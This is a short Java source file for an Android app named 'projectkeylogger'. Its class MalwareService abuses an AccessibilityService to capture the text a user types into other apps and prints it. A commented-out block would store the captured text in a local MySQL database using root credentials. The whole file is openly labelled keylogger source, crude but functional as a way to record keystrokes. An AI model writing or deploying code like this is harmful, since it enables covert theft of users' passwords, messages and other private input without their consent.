package com.example.projectkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.Statement;


public class MalwareService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;

        switch(eventType) {

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = "Logger Typing: ";
                break;
        }
        eventText = eventText + event.getText();

        System.out.println(eventText);
        /*
        Connection con = null;

        try {
            Class.forName("com.mysql.jdbc.Driver");
            con = DriverManager.getConnection("jdbc:mysql://localhost/malwaredb/","root", "");
            String send = "INSERT INTO `table1` (`id`, `data`) VALUES (NULL, 'Test');";
            PreparedStatement prep = con.prepareStatement(send);
            prep.execute();
            con.close();
        }
        catch(Exception e) {
            System.out.print("Error:"+e);
        }
       */

    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }

}
